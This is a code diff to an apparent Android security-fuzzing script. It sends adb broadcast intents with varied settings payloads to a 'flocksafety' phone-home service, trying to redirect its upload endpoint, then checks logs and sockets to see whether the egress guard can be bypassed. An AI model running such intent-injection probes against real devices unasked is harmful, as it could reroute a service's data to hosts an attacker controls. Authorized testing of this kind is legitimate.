@@ -72,6 +72,31 @@ def ss_snapshot(adb, serial):
     return rec
 
 
+def save_settings_payloads(endpoint: str):
+    settings_variants = [
+        {},
+        {"endpoint": endpoint},
+        {"uploadEndpoint": endpoint},
+        {"uploadUrl": endpoint},
+        {"baseUrl": endpoint},
+    ]
+    for settings in settings_variants:
+        yield {
+            "id": f"settings_json_{'empty' if not settings else '_'.join(settings.keys())}",
+            "extras": [
+                "--es",
+                "requester",
+                "targeted-egress-r2",
+                "--es",
+                "settings",
+                json.dumps(settings, separators=(",", ":")),
+                "--es",
+                "endpoint",
+                endpoint,
+            ],
+        }
+
+
 def load_guidance(path: str | None):
     if not path:
         return {}
@@ -223,34 +248,54 @@ def main():
     for ep in guidance.get('additional_endpoints', []) if isinstance(guidance, dict) else []:
         if isinstance(ep, str) and 'flocksafety.com' in ep.lower() and ep not in endpoints:
             endpoints.append(ep)
+
+    action_variants = [
+        'com.flocksafety.action.SAVE_SETTINGS',
+        'com.flocksaftey.action.SAVE_SETTINGS',
+    ]
     rows_004 = []
     for ep in endpoints:
-        clear_logcat(adb, args.serial)
-        b = run_adb(adb, args.serial, [
-            'shell', 'am', 'broadcast', '-a', 'com.flocksaftey.action.SAVE_SETTINGS', '-p', 'com.flocksafety.android.phonehomeservice',
-            '--es', 'requester', 'targeted-egress-r2', '--es', 'settings', '{}', '--es', 'endpoint', ep,
-        ], timeout=30)
-        time.sleep(1.2)
-        log = read_logcat(adb, args.serial, 600)
-        ss = ss_snapshot(adb, args.serial)
-        host = re.sub(r'^https?://', '', ep, flags=re.IGNORECASE).split('/')[0]
-        host_key = host.split(':')[0]
-        log_text = log.get('stdout') or ''
-        ss_text = ss.get('stdout') or ''
-        marker_words = ['dev-gimlet', 'timed out', 'blocked', 'phonehome', 'unknownhost']
-        host_log_hits = [ln for ln in log_text.splitlines() if host_key.lower() in ln.lower() or any(m in ln.lower() for m in marker_words)][:50]
-        ss_hits = [ln for ln in ss_text.splitlines() if host_key in ln or ':18443' in ln or ':14011' in ln][:50]
-        real_reach = any(('dev-gimlet' in ln.lower()) and 'ESTAB' in ln for ln in ss_hits)
-        rows_004.append({
-            'endpoint': ep,
-            'host_key': host_key,
-            'broadcast_returncode': b.get('returncode'),
-            'broadcast_stdout': (b.get('stdout') or '').strip(),
-            'broadcast_stderr': (b.get('stderr') or '').strip(),
-            'host_log_hits': host_log_hits,
-            'socket_hits': ss_hits,
-            'real_endpoint_reached_signal': real_reach,
-        })
+        for payload in save_settings_payloads(ep):
+            for action in action_variants:
+                clear_logcat(adb, args.serial)
+                b = run_adb(
+                    adb,
+                    args.serial,
+                    [
+                        'shell',
+                        'am',
+                        'broadcast',
+                        '-a',
+                        action,
+                        '-p',
+                        'com.flocksafety.android.phonehomeservice',
+                        *payload['extras'],
+                    ],
+                    timeout=30,
+                )
+                time.sleep(1.2)
+                log = read_logcat(adb, args.serial, 600)
+                ss = ss_snapshot(adb, args.serial)
+                host = re.sub(r'^https?://', '', ep, flags=re.IGNORECASE).split('/')[0]
+                host_key = host.split(':')[0]
+                log_text = log.get('stdout') or ''
+                ss_text = ss.get('stdout') or ''
+                marker_words = ['dev-gimlet', 'timed out', 'blocked', 'phonehome', 'unknownhost']
+                host_log_hits = [ln for ln in log_text.splitlines() if host_key.lower() in ln.lower() or any(m in ln.lower() for m in marker_words)][:50]
+                ss_hits = [ln for ln in ss_text.splitlines() if host_key in ln or ':18443' in ln or ':14011' in ln][:50]
+                real_reach = any(('dev-gimlet' in ln.lower()) and 'ESTAB' in ln for ln in ss_hits)
+                rows_004.append({
+                    'endpoint': ep,
+                    'host_key': host_key,
+                    'action': action,
+                    'payload_id': payload['id'],
+                    'broadcast_returncode': b.get('returncode'),
+                    'broadcast_stdout': (b.get('stdout') or '').strip(),
+                    'broadcast_stderr': (b.get('stderr') or '').strip(),
+                    'host_log_hits': host_log_hits,
+                    'socket_hits': ss_hits,
+                    'real_endpoint_reached_signal': real_reach,
+                })
 
     report['todo_results']['fuzz-targeted-004-endpoint-egress-guard-abuse'] = {
         'summary': {
